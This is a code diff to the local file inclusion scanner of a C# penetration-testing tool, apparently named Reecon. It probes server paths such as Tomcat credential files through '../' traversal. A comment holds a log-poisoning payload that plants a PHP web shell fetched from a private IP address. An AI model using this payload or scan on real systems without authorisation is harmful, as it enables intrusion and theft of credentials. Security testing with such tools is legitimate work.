@@ -23,7 +23,7 @@ namespace Reecon
         {
             Console.WriteLine("Starting LFI Scan - This feature is still in Alpha");
             // Init
-            (initialPart, notFoundLength) = InitialChecks(path);
+            InitialChecks(path);
 
             // Find OS
             var OS = GetOS();
@@ -36,7 +36,7 @@ namespace Reecon
                 {
                     // Log poisoning file upload
                     // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
-                    Console.WriteLine("LFI - Log Poisining File Upload - Bug Reelix");
+                    Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                 }
 
                 // Do MySQL Checks
@@ -57,7 +57,6 @@ namespace Reecon
                 linux_tomcat9.Add("/usr/share/tomcat9/etc/tomcat-users.xml");
                 linux_tomcat9.Add("/usr/share/tomcat9/etc/web.xml");
                 linux_tomcat9.Add("/var/lib/tomcat9/webapps/ROOT/index.html");
-                linux_tomcat9.Add("/var/lib/tomcat9/webapps/ROOT/META-INF/context.xml");
                 DoLFI(linux_tomcat9);
             }
             else if (OS == General.OS.Windows)
@@ -74,7 +73,7 @@ namespace Reecon
         }
 
         // Initial Checks
-        private static (string, int) InitialChecks(string path)
+        private static void InitialChecks(string path)
         {
             Console.WriteLine("Scanning: " + path);
             HttpStatusCode statusCode = wc.GetResponseCode(path);
@@ -84,10 +83,10 @@ namespace Reecon
                 Environment.Exit(0);
             }
 
-            string initialPart = path.Substring(0, path.IndexOf("=") + 1);
+            initialPart = path.Substring(0, path.IndexOf("=") + 1);
             string result = wc.Get(initialPart + "Reelix", null);
-            int notFoundLength = result.Length;
-            return (initialPart, notFoundLength);
+            notFoundLength = result.Length;
+            Console.WriteLine("NFL: " + notFoundLength);
         }
 
         private static General.OS GetOS()
@@ -138,7 +137,7 @@ namespace Reecon
                 if (resultLength != notFoundLength)
                 {
                     hasResult = true;
-                    Console.WriteLine(toCheck + " - LFI");
+                    Console.WriteLine(resultLength + " -- " + toCheck);
                 }
                 // Check with ../'s
                 toCheck = initialPart + "/../../../../.." + check;
@@ -146,7 +145,7 @@ namespace Reecon
                 if (resultLength != notFoundLength)
                 {
                     hasResult = true;
-                    Console.WriteLine(toCheck + " - LFI");
+                    Console.WriteLine(resultLength + " -- " + toCheck);
                 }
             }
             return hasResult;
